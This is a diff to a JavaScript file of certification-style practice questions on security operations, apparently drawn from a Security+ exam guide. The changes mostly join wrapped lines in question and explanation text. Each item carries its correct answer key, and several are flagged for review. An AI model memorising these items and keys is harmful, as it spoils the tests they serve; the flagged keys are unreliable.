@@ -4545,7 +4507,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "multi",
-    "question": "Which of the following are activities that should be completed during the containment and\neradication phases of the incident response process? (Choose two.)",
+    "question": "Which of the following are activities that should be completed during the containment and eradication phases of the incident response process? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -4576,7 +4538,7 @@ export const domain4Questions = [
       "C",
       "D"
     ],
-    "explanation": "During containment, you first pinpoint exactly what malware or attack vector is in play and how\nfar it has spread - i.e. identifying the threat. Then, in the eradication phase, you eliminate the\nroot cause by removing the malicious threat (malware, backdoors, unauthorized accounts, etc.)\nbefore moving on to system recovery.",
+    "explanation": "During containment, you first pinpoint exactly what malware or attack vector is in play and how far it has spread - i.e. identifying the threat. Then, in the eradication phase, you eliminate the root cause by removing the malicious threat (malware, backdoors, unauthorized accounts, etc.)\nbefore moving on to system recovery.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4592,7 +4554,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "Which of the following activities should a systems administrator perform to quarantine a\npotentially infected system?",
+    "question": "Which of the following activities should a systems administrator perform to quarantine a potentially infected system?",
     "choices": [
       {
         "key": "A",
@@ -4614,7 +4576,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Quarantining an infected host means isolating it from the rest of the network to prevent malware\nfrom spreading. Physically or logically placing the device into an air-gapped (isolated)\nenvironment severs its connectivity, effectively containing the threat.",
+    "explanation": "Quarantining an infected host means isolating it from the rest of the network to prevent malware from spreading. Physically or logically placing the device into an air-gapped (isolated) environment severs its connectivity, effectively containing the threat.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4630,7 +4592,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "An employee clicked a malicious link in an email and downloaded malware onto the company's\ncomputer network. The malicious program exfiltrated thousands of customer records.\nWhich of the following should the company implement to best prevent this in the future?",
+    "question": "An employee clicked a malicious link in an email and downloaded malware onto the company's computer network. The malicious program exfiltrated thousands of customer records.\nWhich of the following should the company implement to best prevent this in the future?",
     "choices": [
       {
         "key": "A",
@@ -4652,7 +4614,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Deploying modern endpoint protection (antivirus/EDR) on each workstation can detect and\nblock malicious payloads downloaded via phishing links, stopping the malware before it can\ninstall and exfiltrate customer data. This directly prevents the root cause (malware infection),\nwhereas other controls (like DLP) act later in the attack chain.",
+    "explanation": "Deploying modern endpoint protection (antivirus/EDR) on each workstation can detect and block malicious payloads downloaded via phishing links, stopping the malware before it can install and exfiltrate customer data. This directly prevents the root cause (malware infection), whereas other controls (like DLP) act later in the attack chain.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4668,7 +4630,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A forensic engineer determines that the root cause of a compromise is a SQL injection attack.\nWhich of the following should the engineer review to identify the command used by the threat\nactor?",
+    "question": "A forensic engineer determines that the root cause of a compromise is a SQL injection attack.\nWhich of the following should the engineer review to identify the command used by the threat actor?",
     "choices": [
       {
         "key": "A",
@@ -4690,13 +4652,13 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Application logs capture the SQL statements executed (including user inputs and errors).\nReviewing the application log will reveal the exact injection payload and commands the attacker\nused, whereas system or network logs do not record SQL query details.",
+    "explanation": "Application logs capture the SQL statements executed (including user inputs and errors).\nReviewing the application log will reveal the exact injection payload and commands the attacker used, whereas system or network logs do not record SQL query details.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
     "source": "SY0-701_en.pdf#p204",
     "needsReview": true,
-    "inferenceConfidence": 0.263,
+    "inferenceConfidence": 0.217,
     "needsExplanation": false,
     "keyCorrected": false
   },
@@ -4706,7 +4668,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A security team purchases a tool for cloud security posture management. The team is quickly\noverwhelmed by the number of misconfigurations the tool detects.\nWhich of the following should the security team configure to establish secure baselines for cloud\nresource usage?",
+    "question": "A security team purchases a tool for cloud security posture management. The team is quickly overwhelmed by the number of misconfigurations the tool detects.\nWhich of the following should the security team configure to establish secure baselines for cloud resource usage?",
     "choices": [
       {
         "key": "A",
@@ -4728,7 +4690,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Guardrails define and enforce organization-specific policies and secure configuration baselines\nin cloud environments, automatically detecting and preventing deviations from approved\nsettings.",
+    "explanation": "Guardrails define and enforce organization-specific policies and secure configuration baselines in cloud environments, automatically detecting and preventing deviations from approved settings.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4766,7 +4728,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "CVSS provides a standardized, numerical severity rating for each vulnerability, enabling an\nanalyst to efficiently rank and prioritize scan findings based on objective risk metrics.",
+    "explanation": "CVSS provides a standardized, numerical severity rating for each vulnerability, enabling an analyst to efficiently rank and prioritize scan findings based on objective risk metrics.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4782,7 +4744,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "An administrator must authenticate users to systems using credentials already authenticated by\na business partner's LDAP system.\nWhich of the following should the administrator deploy to enable this functionality?",
+    "question": "An administrator must authenticate users to systems using credentials already authenticated by a business partner's LDAP system.\nWhich of the following should the administrator deploy to enable this functionality?",
     "choices": [
       {
         "key": "A",
@@ -4804,7 +4766,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Federation allows users authenticated by an external identity provider (such as a partner's\nLDAP directory) to access your systems without reentering credentials, by trusting and\nexchanging authentication assertions between domains.",
+    "explanation": "Federation allows users authenticated by an external identity provider (such as a partner's LDAP directory) to access your systems without reentering credentials, by trusting and exchanging authentication assertions between domains.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4820,7 +4782,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following actions would reduce the number of false positives for an analyst to\nmanually review?",
+    "question": "Which of the following actions would reduce the number of false positives for an analyst to manually review?",
     "choices": [
       {
         "key": "A",
@@ -4842,7 +4804,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "By automating the triage and handling of routine or known-false alerts through SOAR\nplaybooks, you filter out those false positives before they reach an analyst, significantly reducing\nmanual review workload.",
+    "explanation": "By automating the triage and handling of routine or known-false alerts through SOAR playbooks, you filter out those false positives before they reach an analyst, significantly reducing manual review workload.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4858,7 +4820,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "The security department is remediating vulnerabilities that were found during an audit of newly\ndeployed systems.\nWhich of the following must be done to ensure compliance?",
+    "question": "The security department is remediating vulnerabilities that were found during an audit of newly deployed systems.\nWhich of the following must be done to ensure compliance?",
     "choices": [
       {
         "key": "A",
@@ -4880,7 +4842,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "After applying fixes, rescanning is essential to verify that the remediated systems no longer\nexhibit the previously detected vulnerabilities, ensuring true compliance with the audit findings.",
+    "explanation": "After applying fixes, rescanning is essential to verify that the remediated systems no longer exhibit the previously detected vulnerabilities, ensuring true compliance with the audit findings.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4896,7 +4858,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A company with a high-availability website is looking to harden its controls at any cost. The\ncompany wants to ensure that the site is secure by finding any possible issues.\nWhich of the following would most likely achieve this goal?",
+    "question": "A company with a high-availability website is looking to harden its controls at any cost. The company wants to ensure that the site is secure by finding any possible issues.\nWhich of the following would most likely achieve this goal?",
     "choices": [
       {
         "key": "A",
@@ -4918,7 +4880,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A bug bounty program leverages a large, diverse community of security researchers who use a\nwide range of testing methods to uncover vulnerabilities. This crowd-sourced approach\nmaximizes the chances of finding any possible issue, far beyond what a single scan or internal\nteam could achieve.",
+    "explanation": "A bug bounty program leverages a large, diverse community of security researchers who use a wide range of testing methods to uncover vulnerabilities. This crowd-sourced approach maximizes the chances of finding any possible issue, far beyond what a single scan or internal team could achieve.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4934,7 +4896,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A human resources (HR) employee working from home leaves their company laptop open on\nthe kitchen table. A family member walking through the kitchen reads an email from the Chief\nFinancial Officer addressed to the HR department. The email contains information referencing\ncompany layoffs. The family member posts the content of the email to social media.\nWhich of the following policies will the HR employee most likely need to review after this\nincident?",
+    "question": "A human resources (HR) employee working from home leaves their company laptop open on the kitchen table. A family member walking through the kitchen reads an email from the Chief Financial Officer addressed to the HR department. The email contains information referencing company layoffs. The family member posts the content of the email to social media.\nWhich of the following policies will the HR employee most likely need to review after this incident?",
     "choices": [
       {
         "key": "A",
@@ -4956,7 +4918,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Operational security (OPSEC) governs how employees protect sensitive information in their\nday-to-day activities, such as ensuring screens are locked and confidential emails aren't left\nexposed in shared spaces. Reviewing OPSEC best practices would help the HR employee\nprevent accidental disclosure in a home environment.",
+    "explanation": "Operational security (OPSEC) governs how employees protect sensitive information in their day-to-day activities, such as ensuring screens are locked and confidential emails aren't left exposed in shared spaces. Reviewing OPSEC best practices would help the HR employee prevent accidental disclosure in a home environment.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4972,7 +4934,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A recent review of logs indicates many attempts to join an internal wireless network from\nexternal devices. The connections appear to be originating from surrounding buildings.\nWhich of the following would best help minimize the visibility of the wireless network?",
+    "question": "A recent review of logs indicates many attempts to join an internal wireless network from external devices. The connections appear to be originating from surrounding buildings.\nWhich of the following would best help minimize the visibility of the wireless network?",
     "choices": [
       {
         "key": "A",
@@ -4994,7 +4956,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Performing a wireless site survey lets you identify where your signal is spilling outside the\nbuilding so you can adjust access point placement, transmit power, and antenna orientation to\nreduce coverage and thus visibility in surrounding areas.",
+    "explanation": "Performing a wireless site survey lets you identify where your signal is spilling outside the building so you can adjust access point placement, transmit power, and antenna orientation to reduce coverage and thus visibility in surrounding areas.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5010,7 +4972,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "The security team notices that the Always On VPN solution sometimes fails to connect. This\nleaves remote users unprotected because they cannot connect to the on-premises web proxy.\nWhich of the following changes will best provide web protection in this scenario?",
+    "question": "The security team notices that the Always On VPN solution sometimes fails to connect. This leaves remote users unprotected because they cannot connect to the on-premises web proxy.\nWhich of the following changes will best provide web protection in this scenario?",
     "choices": [
       {
         "key": "A",
@@ -5032,7 +4994,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Installing a host-based content filtering solution ensures web protection for remote users even\nwhen the VPN is down, as filtering and protection occur directly on the user's device regardless\nof connection to the corporate network.",
+    "explanation": "Installing a host-based content filtering solution ensures web protection for remote users even when the VPN is down, as filtering and protection occur directly on the user's device regardless of connection to the corporate network.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5070,7 +5032,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "An API (Application Programming Interface) is the best option for automating tasks and enabling\nseamless data sharing between different programs, allowing for programmatic interaction and\nautomation.",
+    "explanation": "An API (Application Programming Interface) is the best option for automating tasks and enabling seamless data sharing between different programs, allowing for programmatic interaction and automation.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5117,7 +5079,7 @@ export const domain4Questions = [
       "A",
       "E"
     ],
-    "explanation": "A bug bounty program can improve an organization's reputation by demonstrating a proactive\napproach to security.\nIt enables quicker discovery of vulnerabilities by leveraging external researchers to identify\nissues faster than internal teams alone.",
+    "explanation": "A bug bounty program can improve an organization's reputation by demonstrating a proactive approach to security.\nIt enables quicker discovery of vulnerabilities by leveraging external researchers to identify issues faster than internal teams alone.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5133,7 +5095,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following principles requires that a company must keep files or records for a\nprescribed period of time before it disposes of those files or records?",
+    "question": "Which of the following principles requires that a company must keep files or records for a prescribed period of time before it disposes of those files or records?",
     "choices": [
       {
         "key": "A",
@@ -5155,7 +5117,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Data retention is the principle that mandates an organization to keep files or records for a\nspecified period before disposing of them, often to meet legal or regulatory requirements.",
+    "explanation": "Data retention is the principle that mandates an organization to keep files or records for a specified period before disposing of them, often to meet legal or regulatory requirements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5171,7 +5133,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is the best mitigation for a zero-day vulnerability found in mission-critical\nproduction servers that must be highly available?",
+    "question": "Which of the following is the best mitigation for a zero-day vulnerability found in mission-critical production servers that must be highly available?",
     "choices": [
       {
         "key": "A",
@@ -5193,7 +5155,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "With no patch available for a zero-day, deploying compensating controls, such as enhanced\nmonitoring, intrusion prevention, and strict access restrictions, reduces risk while keeping critical\nservers online.",
+    "explanation": "With no patch available for a zero-day, deploying compensating controls, such as enhanced monitoring, intrusion prevention, and strict access restrictions, reduces risk while keeping critical servers online.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5209,7 +5171,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A remote employee navigates to a shopping website on their company-owned computer. The\nemployee clicks a link that contains a malicious file.\nWhich of the following would prevent this file from downloading?",
+    "question": "A remote employee navigates to a shopping website on their company-owned computer. The employee clicks a link that contains a malicious file.\nWhich of the following would prevent this file from downloading?",
     "choices": [
       {
         "key": "A",
@@ -5231,7 +5193,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "An EDR solution actively monitors and blocks malicious behaviors at the endpoint, including\nintercepting and preventing unauthorized or malicious file downloads, before they can reach the\nsystem.",
+    "explanation": "An EDR solution actively monitors and blocks malicious behaviors at the endpoint, including intercepting and preventing unauthorized or malicious file downloads, before they can reach the system.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5247,7 +5209,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following digital forensics activities would a security team perform when\nresponding to legal requests in a pending investigation?",
+    "question": "Which of the following digital forensics activities would a security team perform when responding to legal requests in a pending investigation?",
     "choices": [
       {
         "key": "A",
@@ -5269,7 +5231,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "E-discovery involves identifying, preserving, and collecting electronically stored information to\ncomply with legal requests during investigations.",
+    "explanation": "E-discovery involves identifying, preserving, and collecting electronically stored information to comply with legal requests during investigations.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5307,7 +5269,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Rescanning the server after applying a security patch confirms whether the vulnerability has\nbeen successfully remediated and is no longer detected.",
+    "explanation": "Rescanning the server after applying a security patch confirms whether the vulnerability has been successfully remediated and is no longer detected.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5323,7 +5285,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "An organization has experienced a breach because a hacker utilized a standard users two-year-\nold password that the hacker found on the dark web.\nWhich of the following would have prevented this attack?",
+    "question": "An organization has experienced a breach because a hacker utilized a standard users two-year- old password that the hacker found on the dark web.\nWhich of the following would have prevented this attack?",
     "choices": [
       {
         "key": "A",
@@ -5345,7 +5307,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "A reuse policy prevents users from using old passwords, which helps protect accounts even if\nprevious passwords are compromised and available on the dark web.",
+    "explanation": "A reuse policy prevents users from using old passwords, which helps protect accounts even if previous passwords are compromised and available on the dark web.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5361,7 +5323,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Users report that certain processes from a batch job are not working correctly and various\nresources are unavailable. An application owner provides the source and destination address\ninformation, and the errors are replicated for troubleshooting purposes.\nWhich of the following should the security team perform next to help isolate the ongoing issue?",
+    "question": "Users report that certain processes from a batch job are not working correctly and various resources are unavailable. An application owner provides the source and destination address information, and the errors are replicated for troubleshooting purposes.\nWhich of the following should the security team perform next to help isolate the ongoing issue?",
     "choices": [
       {
         "key": "A",
@@ -5383,7 +5345,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Packet capture allows the security team to analyze network traffic between the source and\ndestination addresses, helping to identify communication issues or resource availability\nproblems in real time.",
+    "explanation": "Packet capture allows the security team to analyze network traffic between the source and destination addresses, helping to identify communication issues or resource availability problems in real time.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5399,7 +5361,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A company is experiencing loss of availability due to excessive traffic to their front-end web\nservers. The company hires a digital forensics expert to investigate the incident.\nWhich of the following logs should the digital forensics expert review first to diagnose the details\nof this incident?",
+    "question": "A company is experiencing loss of availability due to excessive traffic to their front-end web servers. The company hires a digital forensics expert to investigate the incident.\nWhich of the following logs should the digital forensics expert review first to diagnose the details of this incident?",
     "choices": [
       {
         "key": "A",
@@ -5421,7 +5383,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Load balancer logs provide detailed information about incoming web traffic and distribution to\nthe front-end servers, making them the most relevant source to diagnose excessive traffic and\navailability issues.",
+    "explanation": "Load balancer logs provide detailed information about incoming web traffic and distribution to the front-end servers, making them the most relevant source to diagnose excessive traffic and availability issues.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5437,7 +5399,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A Chief Information Security Officer (CISO) of an enterprise environment wants to ensure that\nusers cannot navigate to known malicious domains. The CISO also wants web traffic on the\nnetwork inspected for malicious activity.\nWhich of the following actions should the CISO take?",
+    "question": "A Chief Information Security Officer (CISO) of an enterprise environment wants to ensure that users cannot navigate to known malicious domains. The CISO also wants web traffic on the network inspected for malicious activity.\nWhich of the following actions should the CISO take?",
     "choices": [
       {
         "key": "A",
@@ -5459,7 +5421,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "A DNS filter blocks lookups to known bad domains, stopping users from reaching them, and a\ncentralized TLS (HTTPS) inspection proxy lets the organization decrypt/inspect HTTP/HTTPS\ntraffic for malicious content before re-encrypting it outbound.",
+    "explanation": "A DNS filter blocks lookups to known bad domains, stopping users from reaching them, and a centralized TLS (HTTPS) inspection proxy lets the organization decrypt/inspect HTTP/HTTPS traffic for malicious content before re-encrypting it outbound.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5475,7 +5437,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "A security analyst is working with the IT group to define appropriate procedures for the\ndestruction of media and assets in the enterprise environment.\nWhich of the following methods provides the strongest level of assurance that the data has been\ndisposed of properly?",
+    "question": "A security analyst is working with the IT group to define appropriate procedures for the destruction of media and assets in the enterprise environment.\nWhich of the following methods provides the strongest level of assurance that the data has been disposed of properly?",
     "choices": [
       {
         "key": "A",
@@ -5501,7 +5463,7 @@ export const domain4Questions = [
     "correct": [
       "E"
     ],
-    "explanation": "Physically destroying the media (industrial shredding/pulverizing) renders the platters/chips\nirrecoverable, providing the highest assurance that no residual data can be reconstructed -\nunlike logical wipes or degaussing, which can fail or be bypassed on certain media types.",
+    "explanation": "Physically destroying the media (industrial shredding/pulverizing) renders the platters/chips irrecoverable, providing the highest assurance that no residual data can be reconstructed - unlike logical wipes or degaussing, which can fail or be bypassed on certain media types.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5517,7 +5479,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A company's Chief Information Security Officer (CISO) wants to enhance the capabilities of the\nincident response team. The CISO directs the incident response team to deploy a tool that\nrapidly analyzes host and network data from potentially compromised systems and forwards the\ndata for further correlation and reporting.\nWhich of the following tools should the incident response team deploy?",
+    "question": "A company's Chief Information Security Officer (CISO) wants to enhance the capabilities of the incident response team. The CISO directs the incident response team to deploy a tool that rapidly analyzes host and network data from potentially compromised systems and forwards the data for further correlation and reporting.\nWhich of the following tools should the incident response team deploy?",
     "choices": [
       {
         "key": "A",
@@ -5539,7 +5501,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "EDR agents sit on hosts, continuously collect rich telemetry (processes, connections, file\nchanges), and can capture network indicators from those endpoints. They rapidly analyze this\ndata locally and ship it to a backend where it's correlated and reported – that's what the CISO\nwants to speed detection and investigation of compromised systems.",
+    "explanation": "EDR agents sit on hosts, continuously collect rich telemetry (processes, connections, file changes), and can capture network indicators from those endpoints. They rapidly analyze this data locally and ship it to a backend where it's correlated and reported – that's what the CISO wants to speed detection and investigation of compromised systems.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5555,7 +5517,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following can be best used to discover a company's publicly available breach\ninformation?",
+    "question": "Which of the following can be best used to discover a company's publicly available breach information?",
     "choices": [
       {
         "key": "A",
@@ -5577,7 +5539,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "OSINT involves systematically gathering and analyzing publicly available data - news reports,\npaste sites, breach repositories, darknet mirrors, social media - to see whether details of your\ncompany's breach have been exposed. It's purpose-built for finding exactly this kind of public\nbreach information.",
+    "explanation": "OSINT involves systematically gathering and analyzing publicly available data - news reports, paste sites, breach repositories, darknet mirrors, social media - to see whether details of your company's breach have been exposed. It's purpose-built for finding exactly this kind of public breach information.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5593,7 +5555,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst learns that an attack vector, which was used as a part of a recent incident,\nwas a well-known IoT device exploit. The analyst needs to review logs to identify the time of\ninitial exploit.\nWhich of the following logs should the analyst review first?",
+    "question": "A security analyst learns that an attack vector, which was used as a part of a recent incident, was a well-known IoT device exploit. The analyst needs to review logs to identify the time of initial exploit.\nWhich of the following logs should the analyst review first?",
     "choices": [
       {
         "key": "A",
@@ -5615,7 +5577,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "The firewall is the choke point that records every inbound/outbound session to the IoT device;\nits timestamps on the first suspicious connection will most reliably show when the exploit traffic\nfirst hit the network. Reviewing those entries pinpoints the initial compromise time before diving\ninto more granular device or segment logs.",
+    "explanation": "The firewall is the choke point that records every inbound/outbound session to the IoT device;\nits timestamps on the first suspicious connection will most reliably show when the exploit traffic first hit the network. Reviewing those entries pinpoints the initial compromise time before diving into more granular device or segment logs.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5631,7 +5593,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A store is setting up wireless access for their employees. Management wants to limit the\nnumber of access points while ensuring all areas of the store are covered.\nWhich of the following tools will help management determine the number of access points\nneeded?",
+    "question": "A store is setting up wireless access for their employees. Management wants to limit the number of access points while ensuring all areas of the store are covered.\nWhich of the following tools will help management determine the number of access points needed?",
     "choices": [
       {
         "key": "A",
@@ -5653,7 +5615,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A site survey analyzes the physical environment to determine optimal access point placement,\nensuring full coverage with the fewest devices needed.",
+    "explanation": "A site survey analyzes the physical environment to determine optimal access point placement, ensuring full coverage with the fewest devices needed.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5669,7 +5631,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A security engineer has been assigned to work on a request from outside counsel. The security\nengineer must provide all email correspondence within a specific date range.\nWhich of the following actions should be taken first in response to the request?",
+    "question": "A security engineer has been assigned to work on a request from outside counsel. The security engineer must provide all email correspondence within a specific date range.\nWhich of the following actions should be taken first in response to the request?",
     "choices": [
       {
         "key": "A",
@@ -5691,7 +5653,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Sending litigation hold notifications is the first step to ensure that all relevant email\ncorrespondence within the specified date range is preserved and not altered or deleted,\nmaintaining compliance with legal requirements.",
+    "explanation": "Sending litigation hold notifications is the first step to ensure that all relevant email correspondence within the specified date range is preserved and not altered or deleted, maintaining compliance with legal requirements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5707,7 +5669,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A security analyst regularly receives emails from users who are concerned that attached files\nmay be malicious.\nWhich of the following should the analyst use to evaluate the suspicious files and report back as\nto whether or not files are a threat?",
+    "question": "A security analyst regularly receives emails from users who are concerned that attached files may be malicious.\nWhich of the following should the analyst use to evaluate the suspicious files and report back as to whether or not files are a threat?",
     "choices": [
       {
         "key": "A",
@@ -5729,7 +5691,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A sandbox safely executes and observes the behavior of suspicious files in an isolated\nenvironment, allowing the analyst to determine if they are malicious without risking the\nproduction network.",
+    "explanation": "A sandbox safely executes and observes the behavior of suspicious files in an isolated environment, allowing the analyst to determine if they are malicious without risking the production network.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5745,7 +5707,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "Which of the following would be used to detect an employee who is emailing a customer list to a\npersonal account before leaving the company?",
+    "question": "Which of the following would be used to detect an employee who is emailing a customer list to a personal account before leaving the company?",
     "choices": [
       {
         "key": "A",
@@ -5767,7 +5729,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Data Loss Prevention (DLP) monitors and controls the movement of sensitive data, enabling\ndetection of attempts to send protected information, such as a customer list, to unauthorized\ndestinations.",
+    "explanation": "Data Loss Prevention (DLP) monitors and controls the movement of sensitive data, enabling detection of attempts to send protected information, such as a customer list, to unauthorized destinations.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -5783,7 +5745,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A CIRT team updates their playbooks to include instructions to respond to a ransomware attack.\nTo prepare for a real event, the team performs a simulation and assesses their performance\nafterward.\nWhich of the following activities does this describe?",
+    "question": "A CIRT team updates their playbooks to include instructions to respond to a ransomware attack.\nTo prepare for a real event, the team performs a simulation and assesses their performance afterward.\nWhich of the following activities does this describe?",
     "choices": [
       {
         "key": "A",
@@ -5805,7 +5767,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A tabletop exercise is a simulated scenario where team members discuss and walk through\ntheir planned response to an incident, such as a ransomware attack, and then assess\nperformance to identify improvements.",
